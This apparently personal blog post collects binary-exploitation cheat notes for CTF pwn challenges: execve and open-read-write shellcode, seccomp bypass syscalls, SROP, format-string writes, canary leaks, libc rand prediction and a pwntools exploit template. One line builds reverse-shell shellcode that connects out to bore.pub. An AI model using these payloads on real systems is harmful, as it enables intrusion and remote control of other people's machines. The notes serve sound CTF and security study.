+++
date = '2026-05-01'
draft = false
title = 'pwn'
ShowToc = true
tags = ["Materials"]
+++


## Why

Finally I'm making a little post about this, because my notes are all over the place.

If you're just starting to learn about this stuff, [this guy is a lifesaver](https://ir0nstone.gitbook.io/notes/binexp/); it was the single best resource I had gotten my hands on, as a complete beginner.

## 32-bit

I forget this every time I need it. [Source](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions).

This is how it expects data, on the stack (turn on light mode, sorry):

![challenge-screenshot](image.png#center)

Function, return address, parameter 1, parameter 2, and so forth.

## pwntools stuff

 - You can also send a parameter using pwntools. It's pretty simple: `p=elf.process(argv=[payload])`.

 - `data = p.recvuntil(b"\n[", drop=True)`: with `drop = True` it will *NOT* include the `b"\n["` in the data.

## shellcoding

Amazing [docs](https://learn.dreamhack.io/50#1)


### notes

 - Simple shell: `shell = asm(shellcraft.sh())`
 
 - Shortest shell, 23 bytes: `shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'`
 
 - You forgot to add `context.arch = 'amd64'` or `context.arch = 'i386'`
 
 - For normal functions, function arguments are `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9`
 
 - For syscalls, function arguments are `rdi`, `rsi`, `rdx`, `r10`, `r8` and `r9`.
 
 - Returning values are in `rax`, and so is the syscall number
 
### orw

So, this is just [syscalls](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

But I suppose these are the most important. Let's discuss them one by one.

#### open("/tmp/flag", O_RDONLY, NULL)

First, creating the connection to the file - this will return the *fd* (file descriptor) in `rax`.

When pushing a file name, for an orw type of situation, it needs to be pushed in little endian, and in chunks smaller than eight. Split them in eights, then swap endianness and send them in that order. This can be done in cyberchef. Just input the byte size of your input (in this case 9 bytes).

![challenge-screenshot](endian.png#center)

There is also a function in pwntools that takes care of this:

```python
return hex(int.from_bytes(msg.encode(), "little"))
```

You should know, you can only push up to an `imm32` (immediate 4 byte value) on the stack; A bigger value, such as `imm64`, first needs to be `mov`ed into a register and can only *then* be pushed.

Looking at the table from the [syscall table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), we need `rax` to be 2, `rdi` to point to the filename, `rsi` to be flags and `rdx` to be *mode*. 

The *flags* can be:

- 0, read-only, `O_RDONLY`

- 1, write-only, `O_WRONLY`

- 2, read/write, `O_RDWR`

I guess we only need 0 for this, and `rdx` has no importance in this scenario either, just leave it null. And here, we will assume that the string's going to end in a null byte; if it doesn't, just push a null byte as well.

This is what the asm code should look like:

```asm
push 0x67
mov rax, 0x616c662f706d742f
push rax

mov rax, 2
mov rdi, rsp

xor rsi, rsi
xor rdx, rdx

syscall
```

#### read(fd, buf, size)

In this case, we're going to read 0x30 bytes and store them at `rsp-0x30` (buf), so we can access it later; By this I mean we're going to "push" it by subtracting the size from `rsp` ourselves.

```asm
mov rdi, rax
sub rsp, 0x30

mov rsi, rsp
mov rdx, 0x30
mov rax, 0

syscall
```

#### write(fd, buf, size)

Since stdout is fd 1, and we want to print the 0x30 bytes from the stack we just pushed, let's keep that in mind; And we don't necessarily need to modify `rsi` and `rdx`, if the last thing that happened was our read.

```asm
mov rdi, 1
mov rax, 1

syscall
```

#### shellcraft

You can also just be lazy and use shellcraft for this:

```python
dir = "/home/lalala/flag.txt"
shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
```

### execve shellcode

Or precisely `execve("/bin/sh", null, null)`; this time, `rax` needs to be `0x3b` and `rdi` needs to be "/bin/sh".

```asm
mov rax, 0x68732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

mov rax, 0x3b
syscall
```

### blacklist

 - Find out whether some character stops the blacklist, add it in the shellcode, but jump over it, details [here](https://book.jorianwoltjer.com/binary-exploitation/shellcode)
 
 - This [website](https://masterccc.github.io/tools/shellcode_gen/) to generate shellcode to print files, for 32-bit.
 
 More about these special characters breaking functions; Sometimes, in shellcoding challenges, the bytes escape out of the function that reads them. Here are those said bytes:
 
 ![challenge-screenshot](table.png#center)
 
 For `scanf`'s `0x0b` thing, using `sub eax, -0x0b` instead of `add eax, 0x0b` will bypass it.

 But sometimes we don't want to bother with this sort of thing; well, pwntools has something build exactly for this:
 
```python
sc = asm(shellcraft.sh())
bad = b"\x00\x0a\x0d\x20\x0b"
encoded = pwnlib.encoders.encode(sc, avoid=bad)
```

Here are the [docs](https://docs.pwntools.com/en/stable/encoders.html). It might, for example, xor and then xor your payload again, to bypass the "avoid".

What's more, `from pwnlib.encoders` you can import `printable`, `alphanumeric` and `null`. Then, you can use them like `encoded = printable.encode(sc)`.

### seccomp

Great explanation [here](https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces)

To get insight, run `seccomp-tools dump ./binary`. It's going to look something like this:

```bash
└─$ seccomp-tools dump /home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp
shellcode: 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0010
 0006: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0010
 0007: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0010
 0008: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

The structure of a seccomp instruction is this:

```c
struct sock_filter {
    __u16 code; //(opcode/instruction) 2 bytes
    __u8  jt; //(offset jump if true) 1 byte
    __u8  jf; //(offset jump if false) 1 byte
    __u32 k;  //(constant) 4 bytes
};
```

For example, `return ALLOW` has the opcode for `return` and the constant `0x7fff0000`.

This example essentially just blocks all 32-bit syscalls on our arch. 32-bit syscalls are a way to bypass these seccomp rules, because they do the same thing; they can be invoked through the same `rax` syscall number except with the 30th bit enabled: `0x4000003b` instead of `0x3b`. 

The `seccomp-tools` doesn't always work. I don't know why. In these cases, you can run this:

```bash
strace -e trace=read,prctl,seccomp -f /home/kali/Downloads/dreamhack/secureservice/deploy/secure-service < <(printf 'shellcode\n\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05')
```

Sometimes, they forget to block stuff; Like `openat`. The difference is, you must add another argument, at the first position, which is a directory file descriptor.

Making that be `AT_FDCWD`, with the value of `-100` (`0xffffff9c`), will make `openat` behave the same as `open`. That just means open in the current directory.

```c
open(pathname, flags)
openat(dirfd, pathname, flags)
```

Here are some suggestions from Claude.

![challenge-screenshot](sec1.png#center)

In fact, here is a cheatsheet with everything to replace blocked ORW tech.

First, `open(path, O_RDONLY)`:

```c
openat(-100, "flag.txt", 0)

struct open_how how = {0, 0, 0}; //flags=0, mode=0, resolve=0
openat2(-100, "flag.txt", &how, sizeof(how))
```

Next, `read(fd, buf, count)`:

```c
//iov is an array of {buf, len} structs (iovec)
//reads into multiple buffers in one syscall
//readv(fd, iov, iovcnt)
struct iovec iov = {buf, 100};
readv(fd, &iov, 1)

// same as read but reads from specific offset in file
//pread64(fd, buf, count, offset)
pread64(fd, buf, 100, 0)

//preadv(fd, iov, iovcnt, offset)
//pread + readv combined; multiple buffers + specific offset
preadv(fd, &iov, 1, 0)

preadv2(fd, &iov, 1, 0, 0)
```

For `write(fd, buf, count)`:

```c

struct iovec iov = {buf, 100};
writev(1, &iov, 1)

pwrite64(1, buf, 100, 0)     // offset=0
pwritev(1, &iov, 1, 0)
pwritev2(1, &iov, 1, 0, 0)  // flags=0
```

There is also a send/copy family:

```c
//sendfile(out_fd, in_fd, offset*, count)
//// copies from in_fd to out_fd entirely in kernel

//splice(fd_in, off_in, fd_out, off_out, len, flags)
//like sendfile but works between any fds
//one of them must be a pipe
pipe(pipefd)
splice(fd, NULL, pipefd[1], NULL, 100, 0)   // file into pipe
splice(pipefd[0], NULL, 1, NULL, 100, 0)    // pipe into stdout
```

A pipe is a kernel buffer with two ends; `pipefd[0]` is the read end and `pipefd[1]` the write end. Whatever we write into `pipefd[1]` comes out of `pipefd[0]`.

```bash
file ──splice──► pipe[1]  →  pipe[0] ──splice──► stdout
```




## SROP

Some great resources; What I'm doing is merely a TLDR here. So if you really care go read this stuff:

- [bananamafia.dev/post/srop/](https://bananamafia.dev/post/srop/)

- [trustie.medium.com/srop](https://trustie.medium.com/srop-9993651fe046)

- [ctf--wiki-org.translate.goog/srop](https://ctf--wiki-org.translate.goog/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-GB)

This exploitation is pretty interesting: it relies on the `rt_sigreturn` function. When a signal happens, a handler has to respond to it. The kernel, in order to resume the process smoothly after the handler executes its stuff, has to save the context of what it was doing.

The context is the registers, and a couple more stuff. But we care about the registers. 

So: `signal -> push registers -> handler -> handler calls sigreturn -> pop registers`. 

This is extremely useful when we don't have the usual ROP gadgets (`pop rdi; ret` type of stuff), but we have a lot of buffer overflow and some `syscall` gadgets.

First, to call `sigreturn`, you must set `rax` to `0xf` (15) and `syscall`. There are multiple ways to go about this:

- `pop eax/rax` gadget;

- through `read`; as it returns the amount of bytes read into `rax`; first null `rax`, then call `syscall`, and you're set.


After you get past this hurdle, pwntools does the annoying part for you:

```python
frame = SigreturnFrame();
frame.rax = 0xb
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += bytes(frame)
```

If you don't want to just call `execve`, you can call `mprotect` on a memory area of choice, make it executable and writeable and shift the stack to that address (put the entry point of the shellcode in `rsp`, to be able to write it easily, then redirect `rip` to it).

![challenge-screenshot](mprot.png#center)

## fmt-str

These will write the number of characters printed so far, into the address pointed to by the next argument.

- `%n` writes 4 bytes

- `%hn` writes 2 bytes

- `%hhn` writes 1 byte

- `%lln` writes 8 bytes

We don't actually need to write them, we can use padding:

- `%100c` "writes" 100 chars.

If the address at `%12$p` is `0x7ffd...1230` and we want to change its last two bytes to `0x4080`:

- `%16512c%12$hn`, since `0x4080` in decimal is `16512`.

BUT! The second write, we need to substract from the second padding what we added in the first, because there's already a 16512 written, in this case. So it would be `%(X-16512)c`.

We don't usually need to bother with that, since we can use `fmtstr_payload` from pwntools. But, when our stuff is getting printed by `printf`, null bytes wreak our payload and we need to do it manually. 

```python
writes = {
addr: value,
addr2: value2
}
start = #index at which your input starts showing up on stack
fmtstr_payload(start, writes, write_size='byte') #can choose byte, short, int 
```

To automatically find the offset at which your input begins at, this will work:

```python
from pwn import *
elf = ELF('/home/kali/Downloads/main')

cyberedu = '34.185.222.215:30484'
context.arch = 'amd64'

ip, port = cyberedu.split(':')
port = int(port)

def send(payload):
    p = elf.process()
    p.sendline(payload)
    return p.recvall()

fmt = FmtStr(execute_fmt=send)
print(fmt.offset)
```

- Print some stack pointers in python: `print(".".join(f"%{i}$p" for i in range(1, 51)))`

## canary

Check the canary in `gdb` with checksec; it will print out nicely right there. Usually you can just find the canary using a fmtstr vuln.

The canary is usually right before `rbp` on the stack. You can also view the canary with the `canary` command in `pwndbg`:

![challenge-screenshot](canary.png#center)

This way, it's easier to calculate the offset!

And, sometimes, you just overflow a buffer right before the canary, in the sense that you overwrite the null byte so it prints what comes right after it.

## arm

I made a separate post [here](https://irinasusca.github.io/writeup-blog/arm).



## random 

Sometimes we need to generate a random number. Just add this in your python script and you should be grand. You will definitely need to mess around with the `i` offset, based on how long connection takes.

```python
from ctypes import CDLL
import time
#c code
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time.time())

i=10
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    	random_seed = seed
    
    j=j+1
    
    
#save the seed at now + i

libc.srand(random_seed)
random_number = libc.rand()
    
print(f"random number for i={i} is {random_number}")
```

## _IO_FILE

Sources [here](https://www.slideshare.net/slideshow/play-with-file-structure-yet-another-binary-exploit-technique/81635564), [there](https://chovid99.github.io/posts/file-structure-attack-part-1/).

If you want to view an address as, say, an _IO_FILE struct, you can just specify `p *(struct _IO_FILE_plus *)0x606060`. If you want to actually see them, after doing `p _IO_list_all` you can `p *(struct _IO_FILE_plus *) 0xaddr`.

But what is `_IO_list_all`? Well, it's a pointer to the first `_IO_FILE` (head) entry in the `_IO_FILE` chain. Then, each one points to the next (stderr -> stdout -> stdin -> ...). That's happening through the `_chain` pointer each structure has.

The `vtable` lives inside each `_IO_FILE` structure, after all the `file` details. Inside the `vtable` is a, well, table of all the function used by these structures. Usually it's at offset `_IO_FILE + 0xd8`.

Keep in mind, when overwriting the `vtable`, versions more recent than 2.23 will throw an `Fatal error: glibc detected an invalid stdio handle` error.


## reverse shell

You can read more about it [here](https://irinasusca.github.io/writeup-blog/revshell).

If you need a reverse shell, through shellcoding, pwntools will take care of you:

```python
shellcode = shellcraft.connect('bore.pub', 33843)
shellcode += shellcraft.findpeersh()
```

That's it!

## testing

Sometimes you need to test how one of your ideas will work, so you don't waste time trying a wrong hypothesis. You can create your own C file, write what you're trying to achieve, and compile it with `gcc file.c`.

Then, look through the binary - you can set breakpoints at important calls and it might clear up what you need to do with your registers.


## pwndbg

I keep discovering really cool stuff about this - for example, the stack layout:

![challenge-screenshot](stack.png#center)

It shows you each value at the offset from both `rsp` (positive) and `rbp` (negative)! 

You can also view the full stack frame with `telescope $rsp 50`.

To set a pie breakpoint just do `brva 0xoffset`.

You can quickly view the got by (guess what) writing `got`.

## boilerplate

This is the template with useful comments that I use as a starting point for all my pwn challenges:

```python
from pwn import *
elf = ELF('/home/kali/Downloads/file')
p=elf.process()

context.arch = 'amd64'
cyberedu = '34.185.222.215:30484'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
# read hex leak: 
# pie_leak = int(pie_leak, 16)

# read hex bytes: 
# val = u64(data.ljust(8, b"\x00"))

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#strings libc.so.6 | grep "GNU C Library"
#strings libc.so.6 | grep "release version"

#print(".".join(f"%{i}$p" for i in range(1, 51)))
#shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' shortest shell

p.interactive()
```
